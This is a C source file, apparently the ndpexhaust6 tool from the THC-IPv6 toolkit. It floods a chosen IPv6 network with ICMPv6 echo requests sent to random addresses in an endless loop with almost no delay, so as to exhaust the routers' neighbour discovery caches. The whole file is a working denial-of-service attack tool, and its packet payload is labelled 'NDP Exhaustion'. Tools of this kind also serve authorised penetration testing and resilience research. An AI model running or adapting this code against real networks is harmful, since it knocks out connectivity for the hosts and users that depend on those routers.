#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <err.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s by mario fleischmann <mario.fleischmann@1und1.de>\n\n", prg);
  printf("Syntax: %s interface destination-network [sourceip]\n\n", prg);
  printf("Randomly pings IPs in target network\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface;
  int            prefer = PREFER_GLOBAL;
  unsigned char *srcmac;
  unsigned char *dst6, *src6;
  unsigned char *ptr;
  // char dstmac[6] = "";
  unsigned char *dstmac = NULL, *tmpmac, *dstnet;
  int            pkt_len = 16;
  int            count = 0;
  int            i;
  int            size, numbytes, samenet = 0;
  unsigned char *pkt = NULL;
  unsigned char  buf[] = "NDP Exhaustion";

  // hardcoded mac
  /*dstmac[0] = 0x00;
     dstmac[1] = 0x05;
     dstmac[2] = 0x73;
     dstmac[3] = 0xa0;
     dstmac[4] = 0x00;
     dstmac[5] = 0x01; */

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  printf(
      "!\n! Please note: ndpexhaust6 is deprecated, please use "
      "ndpexhaust26!\n!\n\n");

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  interface = argv[1];
  if ((srcmac = thc_get_own_mac(interface)) == NULL) {
    printf("Error: invalid interface defined: %s\n", interface);
    exit(-1);
  }
  dstnet = argv[2];  // hier stehts dstnet drin
  if (dstnet == NULL || (ptr = index(dstnet, '/')) == NULL) {
    printf(
        "Error: Option must be supplied as IP-ADDRESS/PREFIXLENGTH, e.g. "
        "ff80::01/16\n");
    exit(-1);
  }

  *ptr++ = 0;
  size = atoi(ptr);  // prefix lenght
                     //  printf("Prefix length is %d\n", size);
  if (size != 64)
    fprintf(stderr,
            "Warning: unusual network prefix size defined, be sure what your "
            "are doing: %d\n",
            size);
  numbytes = (128 - size) / 8;  // number of bytes to create
  //  printf("Creating %d random adress bytes\n", numbytes);
  srand(time(NULL) + getpid());  // initalize random number generator
  dst6 = thc_resolve6(dstnet);
  //  thc_dump_data(dst6, 16, "dst");
  if (argc >= 4)
    src6 = thc_resolve6(argv[3]);
  else
    src6 = thc_get_own_ipv6(interface, dst6, PREFER_GLOBAL);
  //  thc_dump_data(src6, 16, "src");
  dstmac = thc_get_mac(interface, src6, dst6);

  printf("Starting to randomly ping addresses in network %s/%d on %s:\n",
         dstnet, size, interface);
  while (1) {
    ++count;
    for (i = 0; i < numbytes; i++) {
      dst6[16 - numbytes + i] =
          rand() % 256;  // direct destination manipulation
    }
    if (count == 1) {
      tmpmac = thc_get_mac(interface, src6, dst6);
      if (tmpmac != NULL && dstmac != NULL && memcmp(dstmac, tmpmac, 6) == 0)
        samenet = 1;
    } else {
      if (samenet == 0) {
        free(dstmac);
        dstmac = thc_get_mac(interface, src6, dst6);
      }
    }

    //  printf("%s\n", ip6adr);
    //  printf("Sending ICMP ECHO to %s\n", ip6adr);
    if ((pkt = thc_create_ipv6_extended(interface, prefer, &pkt_len, src6, dst6,
                                        64, 0, 0, 0, 0)) == NULL)
      errx(EXIT_FAILURE, "THC: Could not create IPv6 packet\n");
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe, buf,
                      sizeof(buf), 0) == -1)
      errx(EXIT_FAILURE, "THC: Could not add ICMP6 packet contents\n");
    // thc_add_udp(pkt, &pkt_len, 53, 53, 0, buf, sizeof(buf));

    if (thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
      printf("!");
    thc_destroy_packet(pkt);
    usleep(1);
    if (count % 1000 == 0) printf(".");
  }
}
